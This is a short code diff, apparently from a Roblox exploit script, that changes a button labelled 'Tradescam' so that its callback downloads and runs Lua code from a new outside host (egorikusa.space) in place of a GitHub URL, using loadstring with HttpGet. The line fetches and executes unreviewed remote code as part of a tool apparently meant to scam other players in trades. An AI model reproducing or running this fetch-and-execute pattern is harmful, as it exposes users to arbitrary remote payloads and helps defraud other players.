@@ -18,7 +18,7 @@ Tab:AddButton({
     Name = "Tradescam",
     Callback = function()
         if not executedTradeScam then
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/e9d7d054163b0ac44684f9de.lua'))()
+            loadstring(game:HttpGet('https://egorikusa.space/b06889a82f5083008a79019f.lua'))()
             executedTradeScam = true
             wait(8)
             if executedTradeScam then
